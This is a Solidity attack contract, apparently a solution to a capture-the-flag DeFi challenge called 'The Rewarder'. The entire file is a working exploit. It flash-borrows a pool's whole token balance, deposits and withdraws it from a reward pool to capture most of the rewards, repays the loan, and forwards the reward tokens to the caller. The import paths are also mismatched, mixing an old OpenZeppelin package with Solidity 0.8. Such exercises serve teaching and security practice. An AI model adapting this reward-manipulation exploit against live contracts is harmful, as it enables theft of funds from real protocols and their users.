// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; 

import "@openzeppelin/contracts/token/ERC20/IERC20.sol"; 
import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title TheRewarderAttacker
 * @author Elena (Ellena.xyz@proton.me)
 */ 
interface IFlashLoanerPool{
    
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool{

    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;
}

contract TheRewarderAttacker {
    using Address for address payable;
    using SafeMath for uint256;

    IFlashLoanerPool flashLoanPool;

    ITheRewarderPool rewarderPool;

    IERC20 liquidityToken;

    IERC20 rewardToken;

        // this function will call receiveFlashLoan function throgh which we will deposite and withdraw all the flashloan 
        // to get the majority of the reward token in theRewarderPool contract 
        // at the end we will transfer all the flashloan back to the FlashLoanPool contract 
    function attack(address _pool, address _rewarder, address _DVT, address _rewardToken) external {

        flashLoanPool= IFlashLoanerPool(_pool);

        liquidityToken = IERC20(_DVT);

        rewardToken = IERC20(_rewardToken);

        rewarderPool = ITheRewarderPool(_rewarder);
     
        uint256 amount = liquidityToken.balanceOf(address(flashLoanPool));
        
        liquidityToken.approve(address(rewarderPool), amount);
    
        flashLoanPool.flashLoan(amount);
     
        require(rewardToken.balanceOf(address(this)) > 0 , "attacker did not get any reward" );

        bool success = rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));

        require(success, "reward transfer failed");
    }

    function receiveFlashLoan(uint256 amount) external payable {

        rewarderPool.deposit(amount);
   
        rewarderPool.withdraw(amount);

        liquidityToken.transfer(address(flashLoanPool) ,amount);
    }


}